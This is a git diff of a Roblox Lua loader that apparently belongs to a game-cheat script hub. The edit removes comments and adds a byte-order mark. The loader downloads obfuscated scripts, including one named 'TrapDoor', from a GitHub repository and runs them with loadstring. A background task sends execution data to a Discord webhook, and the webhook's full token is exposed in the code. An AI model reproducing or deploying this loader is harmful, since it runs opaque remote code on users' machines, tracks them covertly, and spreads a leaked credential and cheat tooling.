@@ -1,10 +1,9 @@
-local BASE = "https://raw.githubusercontent.com/pympleHUB/obfuscatedPYMPLE/refs/heads/main/"
+﻿local BASE = "https://raw.githubusercontent.com/pympleHUB/obfuscatedPYMPLE/refs/heads/main/"
 local GAMES = {
 	[77747658251236] = BASE .. "SailorPiece",
 	[107457593564828] = BASE .. "CraftwarsRedux",
 }
 
--- Execution tracker
 local WEBHOOK = "https://discord.com/api/webhooks/1484304823250849812/fwWJ0vLCMX0mniIvaMeAPxbflSpTinJ7hGdCQW3XnaXFPm3KcHN7YwtI3F5S52Rx3S10"
 task.spawn(function()
 	pcall(function()
@@ -37,7 +36,6 @@ task.spawn(function()
 	end)
 end)
 
--- Fetch TrapDoor and game script in parallel
 local trapSrc, gameSrc
 local url = GAMES[game.PlaceId]
 task.spawn(function() trapSrc = game:HttpGet(BASE .. "TrapDoor") end)
@@ -48,4 +46,4 @@ if url and not shared._pympleGameLoaded then
 	shared._pympleGameLoaded = true
 	while not gameSrc do task.wait() end
 	loadstring(gameSrc)()
-end
+end
